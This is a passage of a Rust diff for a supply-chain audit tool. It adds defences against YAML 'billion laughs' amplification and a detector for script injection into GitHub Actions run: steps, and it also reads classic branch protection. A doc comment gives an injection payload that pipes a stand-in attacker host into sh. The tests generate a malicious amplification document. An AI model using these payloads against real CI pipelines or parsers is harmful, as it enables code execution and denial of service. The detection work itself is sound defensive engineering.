@@ -2,8 +2,9 @@
 //!
 //! Basic audit (Phase 1 `actions-audit`): SHA pinning + least-privilege
 //! permissions. Extended audit (Phase 4 `workflow-audit-extended`):
-//! pull_request_target misuse, credential persistence, secret exposure in
-//! logs, risky third-party actions (with StepSecurity maintained-action
+//! pull_request_target misuse, script injection (attacker-controlled contexts
+//! expanded into `run:`), credential persistence, secret exposure in logs,
+//! risky third-party actions (with StepSecurity maintained-action
 //! substitutions), lockfile-exact installs, and Harden-Runner presence.
 
 use crate::config::Config;
@@ -11,7 +12,157 @@ use crate::context::Ctx;
 use crate::controls::{Outcome, VerifyResult};
 use crate::exec;
 use anyhow::{Context as _, Result};
+use std::time::Duration;
 use yaml_rust2::{Yaml, YamlLoader};
+
+/// Hard cap on YAML anchor DECLARATIONS (`&name`) plus alias REFERENCES
+/// (`*name`) permitted in one document — checked BEFORE any of it reaches
+/// the YAML parser.
+///
+/// This, not a time budget, is what actually closes the vector (issue #43).
+/// The first fix here was a wall-clock timeout around the parse, on its own
+/// thread — and MEASUREMENT (replaying a 30-level document through the real,
+/// ASAN-instrumented `workflow_audit` fuzz target) proved that insufficient:
+/// the timeout bounds how long the CALLER waits, not what the abandoned
+/// thread does afterward. That thread went on to allocate past 2.5GB and
+/// trip libFuzzer's OOM guard in under 7 seconds — memory is shared across
+/// every thread in a process, so "the caller already returned an error" is
+/// not "the resource is contained". A time budget that lets the real cost
+/// keep running in the background is a false assurance, not a fix.
+///
+/// So the defense has to happen before yaml-rust2 ever sees the bytes.
+/// `yaml-rust2` 0.10.4 — the version this crate pins, and every version
+/// through 0.13.0, its latest as of this writing, per its own changelog —
+/// applies no bound to alias/anchor expansion: a document of N three-line
+/// anchors, each aliasing the previous TWICE, is under 25 bytes per level
+/// and roughly DOUBLES parse cost per level (96µs at 5 levels, 664ms at 22,
+/// under 500 bytes total). No real GitHub Actions workflow or composite
+/// action uses YAML anchors at all — the feature exists in the YAML 1.1
+/// spec, not in GitHub's authoring guidance — so refusing anything with more
+/// than a handful of anchor/alias tokens costs genuine files nothing while
+/// making the amplification shape structurally unreachable: with at most
+/// this many tokens total, the worst possible blowup a malicious arrangement
+/// could construct is a small, fixed, sub-millisecond bound, not an
+/// unbounded exponential one.
+const YAML_ANCHOR_ALIAS_LIMIT: usize = 16;
+
+/// Conservatively count anchor-declaration and alias-reference TOKENS in raw
+/// YAML text, without parsing it.
+///
+/// Deliberately an OVER-count, not a precise grammar: it matches `&`/`*` at
+/// any position YAML allows a scalar to start — after whitespace, `:`, `-`,
+/// `,`, `[`, or `{`, or at the very start of the document — immediately
+/// followed by at least one anchor-name character. That is the conservative
+/// direction to be wrong in. A `run:` step's shell content essentially never
+/// puts `&`/`*` directly after one of those bytes with no space (`ls *.txt`
+/// has a space before `*`; `cmd &` backgrounding has `&` at END of a token,
+/// not the start) — false positives are rare and refusing one is a far
+/// better failure mode than parsing an amplification document. This is a
+/// COUNTING pass only; it never allocates the anchor/alias NAMES, never
+/// builds a document tree, and its own cost is linear in the input length
+/// with no recursion — it cannot itself be turned into the attack it exists
+/// to detect.
+fn count_anchor_alias_tokens(content: &str) -> usize {
+    fn is_boundary(prev: Option<u8>) -> bool {
+        match prev {
+            None => true,
+            Some(b) => matches!(b, b'\n' | b' ' | b'\t' | b':' | b'-' | b'[' | b'{' | b','),
+        }
+    }
+    fn is_name_char(b: u8) -> bool {
+        b.is_ascii_alphanumeric() || b == b'_' || b == b'-'
+    }
+
+    let bytes = content.as_bytes();
+    let mut count = 0usize;
+    let mut i = 0usize;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if (b == b'&' || b == b'*') && is_boundary(i.checked_sub(1).map(|p| bytes[p])) {
+            let start_of_name = i + 1;
+            let mut j = start_of_name;
+            while j < bytes.len() && is_name_char(bytes[j]) {
+                j += 1;
+            }
+            if j > start_of_name {
+                count += 1;
+                i = j;
+                continue;
+            }
+        }
+        i += 1;
+    }
+    count
+}
+
+/// Refuse a YAML document whose anchor/alias token count exceeds
+/// [`YAML_ANCHOR_ALIAS_LIMIT`] — see that constant's doc comment for why
+/// this, and not a parse timeout, is the real fix.
+fn refuse_yaml_amplification_shape(content: &str) -> Result<()> {
+    let count = count_anchor_alias_tokens(content);
+    anyhow::ensure!(
+        count <= YAML_ANCHOR_ALIAS_LIMIT,
+        "{count} YAML anchor/alias tokens (`&name` or `*name`) found — refused before parsing. \
+         No real GitHub Actions workflow or composite action uses this many; this is the shape \
+         of a YAML \"billion laughs\" amplification document, not a legitimate file"
+    );
+    Ok(())
+}
+
+/// Upper bound on how long parsing may run after the anchor/alias check
+/// above has already passed.
+///
+/// Explicitly a SECONDARY backstop, not the primary defense: it catches a
+/// CPU-time pathology unrelated to alias amplification (a future yaml-rust2
+/// regression, or some other shape not yet measured) that the count check
+/// above would not see coming. It does **not** bound memory — a document
+/// that blows this budget leaves its worker thread running until the
+/// process exits, and that thread can still allocate in the meantime, which
+/// is precisely the property that disqualified a timeout as the primary fix
+/// above. Two seconds is generous for any real workflow file.
+const YAML_PARSE_BUDGET: Duration = Duration::from_secs(2);
+
+/// Parse untrusted workflow/action YAML: refuse the measured amplification
+/// shape outright, then apply the CPU-time backstop for anything else.
+fn parse_workflow_yaml(content: &str) -> Result<Vec<Yaml>> {
+    parse_workflow_yaml_with_budget(content, YAML_PARSE_BUDGET)
+}
+
+/// The budget is a parameter so tests can prove the backstop fires in
+/// milliseconds against the exact code path production uses, rather than
+/// burning real seconds per test or asserting against a mock that could
+/// drift from what `parse_workflow_yaml` actually does. The anchor/alias
+/// check above is unconditional regardless of budget — it is not a timing
+/// concern, so there is nothing to parameterize about it.
+fn parse_workflow_yaml_with_budget(content: &str, budget: Duration) -> Result<Vec<Yaml>> {
+    refuse_yaml_amplification_shape(content)?;
+    let owned = content.to_string();
+    run_with_timeout(budget, move || YamlLoader::load_from_str(&owned))?.context("YAML parse error")
+}
+
+/// Run `f` on a background thread and wait up to `budget` for it to finish.
+///
+/// Split out from `parse_workflow_yaml_with_budget` so the timeout mechanism
+/// itself can be tested with a workload whose duration the test controls
+/// completely (a sleep), rather than racing a real YAML parse of trivial
+/// content against a zero-duration budget — that construction looked like a
+/// deterministic proof but wasn't: a CI runner fast enough to complete the
+/// spawn-parse-send round trip before the main thread's very next
+/// instruction turns `recv_timeout(Duration::ZERO)` into a coin flip. See
+/// the corresponding test for the real failure this replaced.
+fn run_with_timeout<T: Send + 'static>(
+    budget: Duration,
+    f: impl FnOnce() -> T + Send + 'static,
+) -> Result<T> {
+    let (tx, rx) = std::sync::mpsc::channel();
+    std::thread::spawn(move || {
+        // The receiver may already be gone (budget expired) — a send error
+        // here only means nobody is listening any more.
+        let _ = tx.send(f());
+    });
+    rx.recv_timeout(budget)
+        .map_err(|_| anyhow::anyhow!("did not finish within {budget:?} — refused rather than hung"))
+}
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum Severity {
@@ -135,8 +286,7 @@ fn locate(findings: &mut [Finding], index: usize, total: usize) {
 /// a second document is beside the point — sscsb must not call a file clean on
 /// the strength of the half it read.
 pub fn audit_workflow(file: &str, content: &str, extended: bool) -> Result<Vec<Finding>> {
-    let docs =
-        YamlLoader::load_from_str(content).with_context(|| format!("parsing YAML in {file}"))?;
+    let docs = parse_workflow_yaml(content).with_context(|| format!("parsing YAML in {file}"))?;
     let live: Vec<&Yaml> = docs.iter().filter(|d| !is_blank_doc(d)).collect();
     if live.is_empty() {
         return Ok(vec![Finding::new(
@@ -165,6 +315,7 @@ pub fn audit_workflow(file: &str, content: &str, extended: bool) -> Result<Vec<F
 
         if extended {
             audit_pull_request_target(file, doc, content, &mut of_doc);
+            audit_script_injection(file, doc, &mut of_doc);
             audit_checkout_credentials(file, doc, &mut of_doc);
             audit_secret_exposure(file, doc, &mut of_doc);
             audit_risky_actions(file, doc, &mut of_doc);
@@ -288,8 +439,7 @@ fn composite_action_uses(doc: &Yaml) -> Vec<String> {
 /// spot: a local action can pull in an unpinned third-party action, and the
 /// workflow-level audit never looked inside it.
 pub fn audit_action_file(file: &str, content: &str) -> Result<Vec<Finding>> {
-    let docs =
-        YamlLoader::load_from_str(content).with_context(|| format!("parsing YAML in {file}"))?;
+    let docs = parse_workflow_yaml(content).with_context(|| format!("parsing YAML in {file}"))?;
     let live: Vec<&Yaml> = docs.iter().filter(|d| !is_blank_doc(d)).collect();
     if live.is_empty() {
         return Ok(vec![Finding::new(
@@ -532,6 +682,120 @@ fn audit_pull_request_target(file: &str, doc: &Yaml, raw: &str, findings: &mut V
     }
 }
 
+/// Contexts an outside contributor controls verbatim — an issue or PR title,
+/// a commit message, a branch name. Interpolated into a `run:` script with
+/// `${{ }}` they are expanded by the runner BEFORE the shell parses the
+/// script, so `"; curl attacker | sh; "` in a PR title runs as the workflow.
+/// This is the script-injection half of OpenSSF Scorecard's
+/// Dangerous-Workflow check; the set below is Scorecard's own
+/// (`checks/raw/dangerous_workflow.go`, `untrustedContextPattern`), plus the
+/// discussion and `blocked_user` payloads GitHub added since.
+const INJECTABLE_CONTEXTS: &[&str] = &[
+    "github.event.issue.title",
+    "github.event.issue.body",
+    "github.event.pull_request.title",
+    "github.event.pull_request.body",
+    "github.event.discussion.title",
+    "github.event.discussion.body",
+    "github.event.comment.body",
+    "github.event.review.body",
+    "github.event.review_comment.body",
+    "github.event.head_commit.message",
+    "github.event.head_commit.author.name",
+    "github.event.head_commit.author.email",
+    "github.event.pull_request.head.ref",
+    "github.event.pull_request.head.label",
+    "github.event.pull_request.head.repo.default_branch",
+    "github.head_ref",
+];
+
+/// Array-shaped contexts, where an index or `*` sits between prefix and
+/// suffix: `github.event.commits[0].message`, `github.event.commits.*.author.name`,
+/// `github.event.pages.*.page_name`, and anything under `github.event.blocked_user`.
+const INJECTABLE_WILDCARDS: &[(&str, &str)] = &[
+    ("github.event.commits", ".message"),
+    ("github.event.commits", ".author.name"),
+    ("github.event.commits", ".author.email"),
+    ("github.event.pages", ".page_name"),
+    ("github.event.blocked_user", ""),
+];
+
+/// Every `${{ … }}` expression body in a `run:` script, in order.
+fn expressions(run: &str) -> Vec<&str> {
+    let mut out = Vec::new();
+    let mut rest = run;
+    while let Some(start) = rest.find("${{") {
+        let after = &rest[start + 3..];
+        let Some(end) = after.find("}}") else { break };
+        out.push(after[..end].trim());
+        rest = &after[end + 2..];
+    }
+    out
+}
+
+/// Name the attacker-controlled context inside one expression, or `None`
+/// when it reads only trusted contexts (`github.sha`, `secrets.*`, `matrix.*`,
+/// `github.event.pull_request.head.sha`, …).
+fn injectable_context(expr: &str) -> Option<String> {
+    let compact: String = expr
+        .chars()
+        .filter(|c| !c.is_whitespace())
+        .collect::<String>()
+        .to_ascii_lowercase();
+    // Serialising the whole event dumps every untrusted field at once.
+    for whole in ["tojson(github.event)", "tojson(github)"] {
+        if compact.contains(whole) {
+            return Some(whole.replace("tojson", "toJSON"));
+        }
+    }
+    if let Some(ctx) = INJECTABLE_CONTEXTS.iter().find(|c| compact.contains(*c)) {
+        return Some((*ctx).to_string());
+    }
+    for (prefix, suffix) in INJECTABLE_WILDCARDS {
+        if let Some(at) = compact.find(prefix) {
+            let rest = &compact[at + prefix.len()..];
+            if suffix.is_empty() || rest.contains(suffix) {
+                return Some(format!("{prefix}.*{suffix}"));
+            }
+        }
+    }
+    None
+}
+
+/// Script injection: an attacker-controlled context expanded into a `run:`
+/// script. Scoped to `run:` bodies exactly as Scorecard scopes it — the same
+/// context in `with:`, `env:` or `concurrency:` is not shell-expanded (and
+/// `env:` + `"$VAR"` is the documented fix, so it must stay clean).
+fn audit_script_injection(file: &str, doc: &Yaml, findings: &mut Vec<Finding>) {
+    for (name, job) in jobs(doc) {
+        for step in steps(job) {
+            let Some(run) = step["run"].as_str() else {
+                continue;
+            };
+            let mut seen: Vec<String> = Vec::new();
+            for expr in expressions(run) {
+                let Some(ctx) = injectable_context(expr) else {
+                    continue;
+                };
+                if seen.contains(&ctx) {
+                    continue;
+                }
+                seen.push(ctx.clone());
+                findings.push(Finding::new(
+                    Severity::Error,
+                    file,
+                    format!(
+                        "job `{name}`: `${{{{ {ctx} }}}}` is interpolated into a `run:` script — \
+                         the runner expands attacker-controlled text into the shell before it \
+                         parses (script injection; Scorecard Dangerous-Workflow); pass it \
+                         through `env:` and reference `\"$VAR\"` instead"
+                    ),
+                ));
+            }
+        }
+    }
+}
+
 fn audit_checkout_credentials(file: &str, doc: &Yaml, findings: &mut Vec<Finding>) {
     for (name, job) in jobs(doc) {
         for step in steps(job) {
@@ -687,7 +951,7 @@ fn harden_runner_jobs(doc: &Yaml) -> Vec<(String, HardenRunner)> {
 /// An empty result means the file declares no jobs at all — which proves
 /// nothing about harden-runner, and callers must not read it as a pass.
 pub fn harden_runner_status(content: &str) -> Result<Vec<(String, HardenRunner)>> {
-    let docs = YamlLoader::load_from_str(content).context("parsing workflow YAML")?;
+    let docs = parse_workflow_yaml(content).context("parsing workflow YAML")?;
     Ok(docs.iter().flat_map(harden_runner_jobs).collect())
 }
 
@@ -828,8 +1092,62 @@ pub fn verify_actions_control(ctx: &Ctx, extended: bool) -> VerifyResult {
     }
 }
 
-/// Verify GitHub branch protection through the rules API (covers classic
-/// protection AND rulesets).
+/// Translate the classic branch-protection object
+/// (`GET /repos/{o}/{r}/branches/{b}/protection`) into the rule shapes the
+/// rulesets API returns, so one set of rule checks below scores both
+/// mechanisms. The rulesets API answers `[]` for a branch protected ONLY the
+/// classic way (proven live 2026-09-05 on a throwaway repo with required
+/// reviews, admin enforcement and force-push/deletion blocks all active), so
+/// without this read a whole class of protected repositories scored as
+/// unprotected — worse than OpenSSF Scorecard, which reads both.
+fn classic_protection_as_rules(classic: &serde_json::Value) -> Vec<serde_json::Value> {
+    use serde_json::json;
+    let enabled = |k: &str| classic[k]["enabled"].as_bool().unwrap_or(false);
+    let mut rules = Vec::new();
+    if let Some(pr) = classic.get("required_pull_request_reviews") {
+        rules.push(json!({
+            "type": "pull_request",
+            "parameters": {
+                "dismiss_stale_reviews_on_push": pr["dismiss_stale_reviews"].as_bool().unwrap_or(false),
+                "require_code_owner_review": pr["require_code_owner_reviews"].as_bool().unwrap_or(false),
+                "require_last_push_approval": pr["require_last_push_approval"].as_bool().unwrap_or(false),
+                "required_approving_review_count": pr["required_approving_review_count"].as_u64().unwrap_or(0),
+            }
+        }));
+    }
+    // Classic protection blocks force-pushes and deletions unless the
+    // corresponding `allow_*` toggle is on; absent means blocked.
+    if !enabled("allow_force_pushes") {
+        rules.push(json!({"type": "non_fast_forward"}));
+    }
+    if !enabled("allow_deletions") {
+        rules.push(json!({"type": "deletion"}));
+    }
+    if enabled("required_signatures") {
+        rules.push(json!({"type": "required_signatures"}));
+    }
+    if let Some(checks) = classic.get("required_status_checks") {
+        rules.push(json!({
+            "type": "required_status_checks",
+            "parameters": {
+                "strict_required_status_checks_policy": checks["strict"].as_bool().unwrap_or(false),
+            }
+        }));
+    }
+    rules
+}
+
+/// Verify GitHub branch protection. Three reads, in order, per branch:
+///
+/// 1. the rulesets API (`rules/branches/{b}`) — rulesets-protected branches;
+/// 2. when that answers `[]`, the classic endpoint
+///    (`branches/{b}/protection`) — classic-protected branches, translated by
+///    [`classic_protection_as_rules`]; it needs an admin token and answers
+///    403/404 to anyone else;
+/// 3. when that too is refused, the public branch record (`branches/{b}`),
+///    whose `protected` flag any token can read — `true` means protection
+///    exists but its settings are unreadable here (Degraded, never Pass on a
+///    flag alone), `false` means the branch is genuinely unprotected (Fail).
 pub fn verify_branch_protection(ctx: &Ctx, cfg: &Config) -> VerifyResult {
     let id = "branch-protection";
     if crate::exec::find_in_path("gh").is_none() {
@@ -869,9 +1187,14 @@ pub fn verify_branch_protection(ctx: &Ctx, cfg: &Config) -> VerifyResult {
     // was answered the control verified nothing at all — see the Degraded
     // return below.
     let mut answered = 0usize;
+    // Branches the public record says are protected but whose settings no
+    // read here could see (non-admin token). Protection exists; its shape is
+    // unverified — that holds the whole control at Degraded, never Pass.
+    let mut protected_unreadable = 0usize;
+    let gh = |api: &str| exec::run("gh", &["api", api], Some(&ctx.root));
     for branch in &branches {
         let api = format!("repos/{slug}/rules/branches/{branch}");
-        let out = match exec::run("gh", &["api", &api], Some(&ctx.root)) {
+        let out = match gh(&api) {
             Ok(o) => o,
             Err(err) => {
                 return VerifyResult::new(
@@ -888,8 +1211,84 @@ pub fn verify_branch_protection(ctx: &Ctx, cfg: &Config) -> VerifyResult {
             ));
             continue;
         }
-        answered += 1;
-        let rules: Vec<serde_json::Value> = serde_json::from_str(&out.stdout).unwrap_or_default();
+        let mut rules: Vec<serde_json::Value> =
+            serde_json::from_str(&out.stdout).unwrap_or_default();
+        // Rulesets answering directly is one way a branch counts as read; the
+        // classic and public-record arms below count themselves.
+        let rulesets_answered = !rules.is_empty();
+        if rules.is_empty() {
+            // Read 2: classic protection. Admin-only; 403/404 otherwise.
+            let classic_api = format!("repos/{slug}/branches/{branch}/protection");
+            let classic = match gh(&classic_api) {
+                Ok(o) => o,
+                Err(err) => {
+                    return VerifyResult::new(
+                        id,
+                        Outcome::Degraded,
+                        vec![format!("gh failed: {err:#}")],
+                    )
+                }
+            };
+            if classic.success() {
+                let obj: serde_json::Value =
+                    serde_json::from_str(&classic.stdout).unwrap_or_default();
+                rules = classic_protection_as_rules(&obj);
+                answered += 1;
+                messages.push(format!(
+                    "{branch}: no rulesets — read via classic branch protection"
+                ));
+            } else {
+                // Read 3: the public branch record's `protected` flag.
+                let status = classic.stderr.lines().next().unwrap_or("error").to_string();
+                let branch_api = format!("repos/{slug}/branches/{branch}");
+                let record = match gh(&branch_api) {
+                    Ok(o) if o.success() => o,
+                    _ => {
+                        messages.push(format!(
+                            "{branch}: no rulesets, classic protection endpoint answered \
+                             `{status}`, and the branch record could not be read — protection \
+                             unverified"
+                        ));
+                        answered += 1;
+                        protected_unreadable += 1;
+                        continue;
+                    }
+                };
+                let flag: serde_json::Value =
+                    serde_json::from_str(&record.stdout).unwrap_or_default();
+                // GitHub answers a missing branch name with the DEFAULT branch's
+                // record (a followed redirect), so `protected` here would
+                // describe a different branch. Trust the flag only when the
+                // record names the branch that was asked for; otherwise the
+                // branch does not exist on the remote and nothing was verified.
+                let named = flag["name"].as_str().unwrap_or_default();
+                if named != branch.as_str() {
+                    messages.push(format!(
+                        "{branch}: not found on the remote (the branch record answered for \
+                         `{named}` instead) — nothing verified for this name"
+                    ));
+                    continue;
+                }
+                answered += 1;
+                if flag["protected"].as_bool().unwrap_or(false) {
+                    messages.push(format!(
+                        "{branch}: no rulesets and the classic protection endpoint answered \
+                         `{status}` — the public branch record reports `protected: true`, so \
+                         protection exists but its settings need an admin token to read; \
+                         UNVERIFIED, not confirmed"
+                    ));
+                    protected_unreadable += 1;
+                    continue;
+                }
+                messages.push(format!(
+                    "{branch}: no rulesets, classic protection endpoint answered `{status}`, \
+                     public branch record reports `protected: false`"
+                ));
+            }
+        }
+        if rulesets_answered {
+            answered += 1;
+        }
         let active: Vec<&str> = rules
             .iter()
             .filter_map(|r| r.get("type").and_then(|t| t.as_str()))
@@ -1007,6 +1406,15 @@ pub fn verify_branch_protection(ctx: &Ctx, cfg: &Config) -> VerifyResult {
         ));
         return VerifyResult::new(id, Outcome::Degraded, messages);
     }
+    // A branch whose protection exists but could not be read pulls a would-be
+    // Pass down to Degraded; a real gap elsewhere still wins as Fail.
+    if outcome == Outcome::Pass && protected_unreadable > 0 {
+        messages.push(format!(
+            "{protected_unreadable} protected branch(es) could not be read with this token — \
+             an admin token (or a ruleset, which any token can read) makes this verifiable"
+        ));
+        return VerifyResult::new(id, Outcome::Degraded, messages);
+    }
     VerifyResult::new(id, outcome, messages)
 }
 
@@ -1014,6 +1422,147 @@ pub fn verify_branch_protection(ctx: &Ctx, cfg: &Config) -> VerifyResult {
 mod tests {
     use super::*;
     use crate::context::Ctx;
+
+    /// A YAML alias/anchor amplification document. `levels` three-line
+    /// anchors, each aliasing the previous TWICE, so the expanded structure
+    /// is 2^levels nodes from a source document a few bytes longer per
+    /// level — and `2 * levels + 1` anchor/alias TOKENS, which is the count
+    /// [`refuse_yaml_amplification_shape`] actually measures.
+    fn billion_laughs(levels: u32) -> String {
+        let mut doc = String::from("a0: &a0 [\"x\"]\n");
+        for i in 1..levels {
+            doc.push_str(&format!("a{i}: &a{i} [*a{prev}, *a{prev}]\n", prev = i - 1));
+        }
+        doc.push_str(&format!("final: *a{}\n", levels - 1));
+        doc
+    }
+
+    #[test]
+    fn count_anchor_alias_tokens_counts_declarations_and_references() {
+        // Hand-verified (and cross-checked with an independent Python
+        // simulation of the same scan): "a0" declares 1 (&a0); the loop for
+        // i in 1..4 (3 iterations) each adds 1 declaration + 2 references =
+        // 3 tokens × 3 = 9; the trailing `final: *a3` adds 1 more. Total 11.
+        // In general billion_laughs(L) carries exactly 3L - 1 tokens.
+        let doc = billion_laughs(4);
+        assert_eq!(count_anchor_alias_tokens(&doc), 11, "{doc}");
+    }
+
+    #[test]
+    fn the_token_scan_does_not_false_positive_on_ordinary_shell_and_expressions() {
+        // The false-positive resistance the doc comment on
+        // count_anchor_alias_tokens claims, checked against the actual
+        // shapes real workflow steps use: `ls *.txt`'s `*` is followed by
+        // `.`, not a name character, so it never completes a token;
+        // `some-server &`'s `&` has nothing after it on the line; `'*'`'s
+        // `*` is preceded by a quote, which is not a value-start boundary
+        // at all, so it is never even considered a candidate.
+        let doc = r#"
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: ls *.txt
+      - run: some-server &
+      - run: echo "a & b, c * d"
+      - if: contains(github.event.head_commit.message, '*')
+"#;
+        assert_eq!(
+            count_anchor_alias_tokens(doc),
+            0,
+            "none of these are real YAML anchors or aliases"
+        );
+    }
+
+    #[test]
+    fn a_billion_laughs_document_is_refused_before_it_ever_reaches_the_parser() {
+        // The real fix (issue #43): the anchor/alias count check runs BEFORE
+        // yaml-rust2 sees the bytes at all, so this must return in
+        // microseconds regardless of level count — 40 levels would still be
+        // an exponential blowup if actually parsed, but it never gets that
+        // far. No custom budget needed any more; the default path is already
+        // fast because parsing never starts.
+        let doc = billion_laughs(40);
+        let t = std::time::Instant::now();
+        let err = parse_workflow_yaml(&doc).unwrap_err();
+        assert!(
+            t.elapsed() < Duration::from_millis(100),
+            "the check must reject before parsing, not after: took {:?}",
+            t.elapsed()
+        );
+        let msg = format!("{err:#}");
+        assert!(
+            msg.contains("refused before parsing"),
+            "must be named a pre-parse refusal: {msg}"
+        );
+        assert!(
+            msg.contains("119"),
+            "must report the real count (3*40-1): {msg}"
+        );
+    }
+
+    #[test]
+    fn the_limit_is_a_real_boundary_not_a_decoration() {
+        // billion_laughs(5) carries 3*5-1 = 14 tokens (under the limit of
+        // 16); billion_laughs(6) carries 3*6-1 = 17 (one over) — the
+        // smallest step this generator can take across the boundary, so
+        // this is a genuine off-by-one proof, not a generous margin. Proves
+        // the constant is load-bearing rather than a number nothing checks.
+        let under = billion_laughs(5);
+        assert_eq!(count_anchor_alias_tokens(&under), 14);
+        assert!(refuse_yaml_amplification_shape(&under).is_ok());
+
+        let over = billion_laughs(6);
+        assert_eq!(count_anchor_alias_tokens(&over), 17);
+        assert!(refuse_yaml_amplification_shape(&over).is_err());
+    }
+
+    #[test]
+    fn ordinary_workflow_yaml_passes_both_checks() {
+        // The negative control: a real (if tiny) workflow document must not
+        // be mistaken for the attack shape either check guards against.
+        let doc = "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps: []\n";
+        let docs = parse_workflow_yaml(doc).expect("an ordinary document must not be refused");
+        assert_eq!(docs.len(), 1);
+    }
+
+    #[test]
+    fn the_cpu_backstop_mechanism_genuinely_fires_when_a_budget_is_exceeded() {
+        // Proves the SECOND, separate layer — the timeout wrapper — actually
+        // triggers. Exercises `run_with_timeout` directly with a workload
+        // whose duration the test fully controls (a 500ms sleep against a
+        // 5ms budget — a 100x margin), rather than racing a real YAML parse
+        // of trivial content against a zero-duration budget: a real CI run
+        // proved that construction was a genuine race, not a deterministic
+        // proof — a machine fast enough to complete the spawn-parse-send
+        // round trip before the main thread's very next instruction makes
+        // `recv_timeout(Duration::ZERO)` a coin flip, and one such runner
+        // called it heads. Controlling the workload's duration directly
+        // removes the dependency on how fast any given machine happens to
+        // parse a few dozen bytes of YAML. Documents the honest limit stated
+        // in YAML_PARSE_BUDGET's doc comment: this layer does not currently
+        // have a live attack it alone defends against — it is
+        // defense-in-depth for a shape not yet measured.
+        let err = run_with_timeout(Duration::from_millis(5), || {
+            std::thread::sleep(Duration::from_millis(500));
+            42
+        })
+        .unwrap_err();
+        assert!(format!("{err:#}").contains("did not finish within"));
+    }
+
+    #[test]
+    fn audit_workflow_reports_the_pre_parse_refusal_rather_than_hanging() {
+        // The end-to-end path a real `.github/workflows/*.yml` takes,
+        // through the public entry point — not just the bounded helper in
+        // isolation.
+        let doc = billion_laughs(40);
+        let err = audit_workflow("evil.yml", &doc, true).unwrap_err();
+        let msg = format!("{err:#}");
+        assert!(msg.contains("evil.yml"), "must name the file: {msg}");
+        assert!(msg.contains("refused before parsing"), "{msg}");
+    }
 
     /// Throwaway repo bootstrapped through the real `sscsb init` path —
     /// mirrors the pattern in `tests/library.rs` so audit-control tests run
@@ -1211,6 +1760,130 @@ jobs:
             .any(|x| x.message.contains("job `b` uses `permissions: write-all`")));
     }
 
+    fn injection_findings(wf: &str) -> Vec<Finding> {
+        audit_workflow("w.yml", wf, true)
+            .unwrap()
+            .into_iter()
+            .filter(|f| f.message.contains("script injection"))
+            .collect()
+    }
+
+    fn wf_running(run: &str) -> String {
+        format!(
+            "on: [push, issues]\npermissions:\n  contents: read\njobs:\n  b:\n    \
+             runs-on: ubuntu-latest\n    steps:\n      - run: {run}\n"
+        )
+    }
+
+    /// ISC-16: the namesake Dangerous-Workflow case — an issue title expanded
+    /// straight into a shell — is an Error naming the context and the fix.
+    /// The same context twice in one step is one finding, not two.
+    #[test]
+    fn script_injection_flags_issue_title_in_run() {
+        let f = injection_findings(&wf_running(
+            "echo \"${{ github.event.issue.title }}\" && echo \"${{ github.event.issue.title }}\"",
+        ));
+        assert_eq!(f.len(), 1, "{f:?}");
+        assert_eq!(f[0].severity, Severity::Error);
+        assert!(f[0].message.contains("job `b`"));
+        assert!(f[0].message.contains("${{ github.event.issue.title }}"));
+        assert!(f[0].message.contains("env:"));
+    }
+
+    /// ISC-17: every context in Scorecard's `untrustedContextPattern` (plus
+    /// discussion and blocked_user) fires in a `run:` body, and the identical
+    /// context in a `with:` input does not — `with:` is not shell-expanded,
+    /// and that is exactly Scorecard's scope too.
+    #[test]
+    fn script_injection_covers_scorecards_context_set_in_run_only() {
+        let contexts = [
+            "github.event.issue.title",
+            "github.event.issue.body",
+            "github.event.pull_request.title",
+            "github.event.pull_request.body",
+            "github.event.discussion.title",
+            "github.event.discussion.body",
+            "github.event.comment.body",
+            "github.event.review.body",
+            "github.event.review_comment.body",
+            "github.event.commits[0].message",
+            "github.event.commits.*.message",
+            "github.event.commits[0].author.name",
+            "github.event.commits[1].author.email",
+            "github.event.head_commit.message",
+            "github.event.head_commit.author.name",
+            "github.event.head_commit.author.email",
+            "github.event.pages[0].page_name",
+            "github.event.blocked_user.login",
+            "github.event.pull_request.head.ref",
+            "github.event.pull_request.head.label",
+            "github.event.pull_request.head.repo.default_branch",
+            "github.head_ref",
+            "toJSON(github)",
+            "toJson( github.event )",
+        ];
+        for ctx in contexts {
+            let f = injection_findings(&wf_running(&format!("echo \"${{{{ {ctx} }}}}\"")));
+            assert_eq!(f.len(), 1, "{ctx}: {f:?}");
+            assert_eq!(f[0].severity, Severity::Error, "{ctx}");
+
+            let with = format!(
+                "on: issues\npermissions:\n  contents: read\njobs:\n  b:\n    \
+                 runs-on: ubuntu-latest\n    steps:\n      \
+                 - uses: actions/github-script@60a0d83039c74a4a22d5f3b6ac9ecb3b6bc1d55a\n        \
+                 with:\n          title: ${{{{ {ctx} }}}}\n      - run: echo ok\n"
+            );
+            assert!(
+                injection_findings(&with).is_empty(),
+                "{ctx} in with: must not fire"
+            );
+        }
+    }
+
+    /// ISC-18: the documented fix — the context bound in `env:` and read as
+    /// `"$VAR"` — is clean; flagging it would punish the correct pattern.
+    #[test]
+    fn script_injection_env_indirection_is_clean() {
+        let wf = "on: issues\npermissions:\n  contents: read\njobs:\n  b:\n    \
+                  runs-on: ubuntu-latest\n    steps:\n      - env:\n          \
+                  TITLE: ${{ github.event.issue.title }}\n        run: echo \"$TITLE\"\n";
+        assert!(injection_findings(wf).is_empty());
+    }
+
+    /// ISC-19: contexts an attacker does not control stay clean, including
+    /// the PR head SHA (a hash, not text) beside its injectable siblings.
+    #[test]
+    fn script_injection_trusted_contexts_are_clean() {
+        for ctx in [
+            "github.sha",
+            "github.repository",
+            "github.ref",
+            "github.event.number",
+            "github.event.pull_request.head.sha",
+            "secrets.TOKEN",
+            "matrix.os",
+            "steps.build.outputs.path",
+        ] {
+            let f = injection_findings(&wf_running(&format!("echo \"${{{{ {ctx} }}}}\"")));
+            assert!(f.is_empty(), "{ctx}: {f:?}");
+        }
+        // An unterminated expression is not a script — and not a panic.
+        assert!(
+            injection_findings(&wf_running("echo \"${{ github.event.issue.title\"")).is_empty()
+        );
+    }
+
+    /// ISC-20's shape: `github.head_ref` in `concurrency.group` (this repo's
+    /// own `ci.yml:25`) is a workflow key, not a script, and must not fire.
+    #[test]
+    fn script_injection_ignores_head_ref_outside_run() {
+        let wf = "on: pull_request\npermissions:\n  contents: read\n\
+                  concurrency:\n  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}\n  \
+                  cancel-in-progress: true\njobs:\n  b:\n    runs-on: ubuntu-latest\n    \
